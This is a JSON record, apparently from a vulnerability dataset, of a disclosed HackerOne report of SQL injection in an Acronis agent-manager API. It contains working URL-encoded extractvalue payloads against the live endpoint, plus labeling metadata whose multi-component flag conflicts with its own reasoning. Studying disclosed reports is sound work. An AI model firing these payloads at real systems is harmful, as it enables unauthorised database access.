@@ -1,0 +1,42 @@
+{
+  "reported_to": "Acronis",
+  "reported_by": "bourbon ",
+  "title": "SQL Injection in agent-manager",
+  "content": "\n1.https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2C%28select+database%28%29%29%29%29and%27\n2.https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2C%28select+user%28%29%29%29%29and%27\nImpact\nsql injection\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1629121020,
+  "report_url": "https://hackerone.com/reports/962889",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Navigate to the URL: https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2C%28select+database%28%29%29%29%29and%27"
+    ],
+    [
+      2,
+      "Observe the SQL injection response revealing database information"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a SQL injection in the agent-manager API endpoint. By manipulating the 'unit' parameter in the URL, an attacker can execute arbitrary SQL queries, potentially exposing sensitive database information.",
+  "reason": "This vulnerability is straightforward to discover as it involves a basic SQL injection technique (using extractvalue) in a URL parameter. The attack does not require multiple components, complex state manipulation, or novel logic. The injection vector is directly visible in the URL.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability involves manipulating the SQL query through the 'unit' parameter in the URL, which is not directly related to authentication or authorization bypass. The proposed methodologies focus on testing authorization boundaries by swapping user sessions or resource IDs, not on detecting SQL injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
